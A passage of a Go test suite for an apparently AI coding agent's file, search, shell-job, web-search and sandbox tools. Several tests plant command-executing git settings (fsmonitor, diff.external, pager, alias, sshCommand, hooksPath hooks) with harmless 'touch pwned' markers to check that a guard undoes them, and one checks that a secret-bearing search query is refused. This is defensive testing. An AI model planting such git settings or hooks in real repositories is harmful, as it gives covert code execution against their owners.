	if st.Mode().Perm() != 0o640 {
		t.Fatalf("permissions not preserved: %v", st.Mode())
	}
	ents, _ := os.ReadDir(e.Root)
	for _, en := range ents {
		if strings.Contains(en.Name(), ".agentium-") {
			t.Fatal("temporary file left behind")
		}
	}
}

func TestGitGuardVariants(t *testing.T) {
	e := env(t)
	exec.Command("git", "init", "-q", e.Root).Run()
	cases := []string{
		`printf '[core] fsmonitor = "touch pwned"\n' >> .git/config`,
		`git config diff.external 'touch pwned'`,
		`git config pager.log 'touch pwned'`,
		`git config alias.st '!touch pwned'`,
		`mkdir -p .git/modules/sub && printf 'ref: refs/heads/main\n' > .git/modules/sub/HEAD && printf '[core]\n' > .git/modules/sub/config && true`,
	}
	for _, c := range cases[:4] {
		out, _ := call(t, bashTool, e, fmt.Sprintf(`{"cmd":%q}`, c))
		if !strings.Contains(out, "undid") {
			t.Errorf("%s: not undone: %q", c, out)
		}
	}
	// Submodule git dirs are guarded too.
	call(t, bashTool, e, fmt.Sprintf(`{"cmd":%q}`, cases[4]))
	out, _ := call(t, bashTool, e, `{"cmd":"git config -f .git/modules/sub/config core.fsmonitor 'touch pwned'"}`)
	if !strings.Contains(out, "undid .git/modules/sub/config") {
		t.Errorf("submodule config: %q", out)
	}
	// A background change after the command returns is either prevented
	// (the process group is stopped when the command ends) or, for a
	// process that escaped the group, caught at the next command.
	call(t, bashTool, e, `{"cmd":"(sleep 0.3; git config core.sshCommand 'touch pwned') >/dev/null 2>&1 &"}`)
	time.Sleep(600 * time.Millisecond)
	call(t, bashTool, e, `{"cmd":"true"}`)
	cfg, _ := os.ReadFile(filepath.Join(e.Root, ".git", "config"))
	if strings.Contains(string(cfg), "pwned") {
		t.Fatalf("config still has a planted command:\n%s", cfg)
	}
	// Ordinary git work is untouched.
	out, _ = call(t, bashTool, e, `{"cmd":"git remote add origin https://example.com/x.git && git config user.name T"}`)
	if strings.Contains(out, "undid") {
		t.Errorf("false positive: %q", out)
	}
}

func TestReadFIFOAndLargeBinary(t *testing.T) {
	e := env(t)
	fifo := filepath.Join(e.Root, "pipe")
	if err := syscallMkfifo(fifo); err != nil {
		t.Skip("no mkfifo:", err)
	}
	done := make(chan error, 1)
	go func() { _, err := call(t, readTool, e, `{"path":"pipe"}`); done <- err }()
	select {
	case err := <-done:
		if err == nil || !strings.Contains(err.Error(), "not a regular file") {
			t.Fatalf("fifo: %v", err)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("read on a FIFO hung")
	}
	big := make([]byte, 9<<20)
	big[10] = 0
	os.WriteFile(filepath.Join(e.Root, "blob.bin"), big, 0o644)
	if out, _ := call(t, readTool, e, `{"path":"blob.bin"}`); !strings.HasPrefix(out, "(binary file") {
		t.Fatalf("large binary: %.80q", out)
	}
}

func TestSearchSkipsDotEnv(t *testing.T) {
	e := env(t)
	for _, n := range []string{".env.staging", ".envrc", ".env.example"} {
		os.WriteFile(filepath.Join(e.Root, n), []byte("SECRET_VALUE=zzz-marker\n"), 0o644)
	}
	out, _ := call(t, searchTool, e, `{"pattern":"zzz-marker"}`)
	if strings.Contains(out, ".env.staging") || strings.Contains(out, ".envrc") || !strings.Contains(out, ".env.example") {
		t.Fatalf("search: %q", out)
	}
}

func TestEditKeepsHardLinks(t *testing.T) {
	e := env(t)
	p := filepath.Join(e.Root, "a.txt")
	os.WriteFile(p, []byte("one\n"), 0o644)
	link := filepath.Join(e.Root, "b.txt")
	if err := os.Link(p, link); err != nil {
		t.Skip("no hard links:", err)
	}
	call(t, readTool, e, `{"path":"a.txt"}`)
	if _, err := call(t, editTool, e, `{"path":"a.txt","old":"one","new":"two"}`); err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(link); string(b) != "two\n" {
		t.Fatalf("hard link split: %q", b)
	}
}

func TestBackgroundJobs(t *testing.T) {
	e := env(t)
	defer e.KillJobs()
	out, err := call(t, bashTool, e, `{"cmd":"echo ready; while read l; do echo got:$l; done","background":true}`)
	if err != nil || !strings.Contains(out, "job 1 started (running)") || !strings.Contains(out, "ready") {
		t.Fatalf("start: %q %v", out, err)
	}
	out, _ = call(t, bashTool, e, `{"job":1,"stdin":"hello\n"}`)
	if !strings.Contains(out, "got:hello") || strings.Contains(out, "ready") {
		t.Fatalf("stdin/new output only: %q", out)
	}
	out, _ = call(t, bashTool, e, `{}`)
	if !strings.Contains(out, "job 1 · running") {
		t.Fatalf("list: %q", out)
	}
	out, _ = call(t, bashTool, e, `{"job":1,"kill":true}`)
	if !strings.Contains(out, "job 1 stopped") {
		t.Fatalf("kill: %q", out)
	}
	if _, err := call(t, bashTool, e, `{"job":1,"stdin":"x\n"}`); err == nil {
		t.Fatal("input to an exited job must fail")
	}
	// A short job finishes and reports its exit code.
	call(t, bashTool, e, `{"cmd":"echo done; exit 3","background":true}`)
	time.Sleep(300 * time.Millisecond)
	if out, _ := call(t, bashTool, e, `{"job":2}`); !strings.Contains(out, "exited 3") {
		t.Fatalf("exit: %q", out)
	}
}

func TestEditReportsLSPErrors(t *testing.T) {
	if _, err := exec.LookPath("pyright-langserver"); err != nil {
		t.Skip("pyright not installed")
	}
	e := env(t)
	e.LSP = lsp.NewManager(e.Root, os.Environ())
	defer e.LSP.Close()
	out, err := call(t, editTool, e, `{"path":"app.py","new":"def f(x: int) -> int:\n    return x\n\nprint(g(1))\n"}`)
	if err != nil || !strings.Contains(out, "pyright reports 1 error(s) in app.py") || !strings.Contains(out, `"g" is not defined`) {
		t.Fatalf("edit result: %q %v", out, err)
	}
}

func TestWebSearch(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/ddg":
			r.ParseForm()
			fmt.Fprintf(w, `<div><a rel="nofollow" class="result__a" href="//duckduckgo.com/l/?uddg=https%%3A%%2F%%2Fgo.dev%%2Fdoc%%2F&rut=x">The <b>Go</b> docs</a>
<a class="result__snippet" href="x">Docs for %s &amp; more</a></div>`, r.Form.Get("q"))
		case "/brave":
			if r.Header.Get("X-Subscription-Token") != "bk" {
				w.WriteHeader(401)
				return
			}
			fmt.Fprint(w, `{"web":{"results":[{"title":"Brave <strong>hit</strong>","url":"https://b.example/","description":"about it"}]}}`)
		}
	}))
	defer srv.Close()
	oldD, oldB := ddgURL, braveURL
	ddgURL, braveURL = srv.URL+"/ddg", srv.URL+"/brave"
	defer func() { ddgURL, braveURL = oldD, oldB }()
	e := env(t)
	e.AllowPrivateNet = true // the test server is on localhost
	t.Setenv("BRAVE_API_KEY", "")
	t.Setenv("TAVILY_API_KEY", "")
	out, err := call(t, fetchTool, e, `{"search":"go generics"}`)
	if err != nil || !strings.Contains(out, "DuckDuckGo results") || !strings.Contains(out, "1. The Go docs\n   https://go.dev/doc/") || !strings.Contains(out, "Docs for go generics & more") {
		t.Fatalf("ddg: %q %v", out, err)
	}
	t.Setenv("BRAVE_API_KEY", "bk")
	out, _ = call(t, fetchTool, e, `{"search":"x"}`)
	if !strings.Contains(out, "Brave results") || !strings.Contains(out, "1. Brave hit\n   https://b.example/\n   about it") {
		t.Fatalf("brave: %q", out)
	}
	if _, err := call(t, fetchTool, e, `{"search":"leak sk-ant-abcdefghijklmnopqrstu"}`); err == nil {
		t.Fatal("a query carrying a secret must be refused")
	}
}

func TestTTYJobs(t *testing.T) {
	if _, _, err := openPTY(); err != nil {
		t.Skip(err)
	}
	e := env(t)
	defer e.KillJobs()
	out, _ := call(t, bashTool, e, `{"cmd":"[ -t 0 ] && echo IS_TTY || echo NO_TTY","background":true,"tty":true}`)
	if !strings.Contains(out, "IS_TTY") {
		t.Fatalf("tty: %q", out)
	}
	out, _ = call(t, bashTool, e, `{"cmd":"[ -t 0 ] && echo IS_TTY || echo NO_TTY","background":true}`)
	if !strings.Contains(out, "NO_TTY") {
		t.Fatalf("pipe job should not have a tty: %q", out)
	}
	if _, err := exec.LookPath("python3"); err == nil {
		// Python shows its interactive prompt only on a terminal.
		out, _ = call(t, bashTool, e, `{"cmd":"python3 -q","background":true,"tty":true}`)
		if !strings.Contains(out, ">>>") {
			t.Fatalf("python prompt: %q", out)
		}
		id := strings.Fields(out)[1]
		out, _ = call(t, bashTool, e, fmt.Sprintf(`{"job":%s,"stdin":"print(6*7)\n"}`, id))
		if !strings.Contains(out, "42") || strings.Contains(out, "\x1b") {
			t.Fatalf("repl: %q", out)
		}
	}
	// Ctrl-C through the terminal stops a foreground program.
	out, _ = call(t, bashTool, e, `{"cmd":"sleep 30","background":true,"tty":true}`)
	id := strings.Fields(out)[1]
	call(t, bashTool, e, fmt.Sprintf(`{"job":%s,"stdin":"\u0003"}`, id))
	time.Sleep(500 * time.Millisecond)
	if out, _ := call(t, bashTool, e, fmt.Sprintf(`{"job":%s}`, id)); !strings.Contains(out, "exited") {
		t.Fatalf("ctrl-c: %q", out)
	}
	if sandbox.Probe().Available {
		e.Sandbox = &sandbox.Config{Write: sandbox.DefaultWrite(e.Root)}
		out, _ := call(t, bashTool, e, `{"cmd":"[ -t 0 ] && echo IS_TTY; touch /etc/agentium-x 2>&1 | head -1","background":true,"tty":true}`)
		// Landlock says "Permission denied", sandbox-exec "Operation not permitted".
		lower := strings.ToLower(out)
		refused := strings.Contains(lower, "denied") || strings.Contains(lower, "not permitted") || strings.Contains(lower, "read-only")
		if _, err := os.Stat("/etc/agentium-x"); !strings.Contains(out, "IS_TTY") || !refused || err == nil {
			t.Fatalf("sandboxed tty job: %q", out)
		}
		// Stopping an interactive shell also stops the jobs it started
		// in process groups of their own.
		out, _ = call(t, bashTool, e, `{"cmd":"bash --norc -i","background":true,"tty":true}`)
		id := strings.Fields(out)[1]
		out, _ = call(t, bashTool, e, fmt.Sprintf(`{"job":%s,"stdin":"sleep 300 & echo PID=$!\n"}`, id))
		m := regexp.MustCompile(`PID=(\d+)`).FindStringSubmatch(out)
		if m == nil {
			t.Fatalf("shell job: %q", out)
		}
		call(t, bashTool, e, fmt.Sprintf(`{"job":%s,"kill":true}`, id))
		gone := false
		for range 20 {
			st, _ := exec.Command("ps", "-o", "stat=", "-p", m[1]).Output()
			if s := strings.TrimSpace(string(st)); s == "" || strings.HasPrefix(s, "Z") {
				gone = true
				break
			}
			time.Sleep(100 * time.Millisecond)
		}
		if !gone {
			ps, _ := exec.Command("ps", "-o", "pid,ppid,pgid,stat,command", "-p", m[1]).CombinedOutput()
			t.Fatalf("pid %s from the stopped shell is still running:\n%s", m[1], ps)
		}
		e.Sandbox = nil
	}
	if cleanTTY("\x1b[31mred\x1b[0m\r\nline\rprogress 50%\rprogress 100%") != "red\nprogress 100%" {
		t.Fatalf("cleanTTY: %q", cleanTTY("\x1b[31mred\x1b[0m\r\nline\rprogress 50%\rprogress 100%"))
	}
}

func TestBashKillWithJobNumber(t *testing.T) {
	e := env(t)
	defer e.KillJobs()
	out, err := call(t, bashTool, e, `{"cmd":"sleep 30","background":true}`)
	if err != nil {
		t.Fatal(err)
	}
	id := strings.Fields(out)[1]
	// Some models put the job id in kill.
	if _, err := call(t, bashTool, e, `{"kill":`+id+`}`); err != nil {
		t.Fatalf("kill:<id>: %v", err)
	}
	if out, _ := call(t, bashTool, e, `{"job":`+id+`}`); !strings.Contains(out, "exited") {
		t.Fatalf("job still running: %q", out)
	}
}

func TestGitGuardHooksPath(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git needed")
	}
	e := env(t)
	run := func(c string) {
		cmd := exec.Command("sh", "-c", c)
		cmd.Dir = e.Root
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("%s: %v %s", c, err, out)
		}
	}
	run("git init -q && mkdir -p .husky && printf '#!/bin/sh\\necho ok\\n' > .husky/pre-commit && git config core.hooksPath .husky")
	hooks, _ := GitExtras(e.Root)
	if len(hooks) != 1 || !strings.HasSuffix(hooks[0], ".husky") {
		t.Fatalf("hooksPath not found: %v", hooks)
	}
	out, err := call(t, bashTool, e, `{"cmd":"printf 'echo evil\\n' >> .husky/pre-commit"}`)
	t.Log(out, err)
	if !strings.Contains(out, "undid") {
		t.Fatalf("a hook change under core.hooksPath was not undone: %q", out)
	}
	if b, _ := os.ReadFile(filepath.Join(e.Root, ".husky", "pre-commit")); strings.Contains(string(b), "evil") {
		t.Fatal("planted hook survived")
	}
}

func TestEditErrorsPointToTheText(t *testing.T) {
	e := env(t)
	write(t, e, "m.go", "package m\n\nfunc a() int {\n\treturn 1\n}\n\nfunc b() int {\n\treturn 1\n}\n")
	_, err := call(t, editTool, e, `{"path":"m.go","old":"\treturn 1","new":"\treturn 2"}`)
	if err == nil || !strings.Contains(err.Error(), "at lines 4, 8") {
		t.Fatalf("ambiguous: %v", err)
	}
	call(t, readTool, e, `{"path":"m.go"}`)
	_, err = call(t, editTool, e, `{"path":"m.go","old":"func a() int {\n\treturn 3\n}","new":"x"}`)
	if err == nil || !strings.Contains(err.Error(), "lines 3-5") || !strings.Contains(err.Error(), `line 4 differs`) {
		t.Fatalf("closest: %v", err)
	}
}
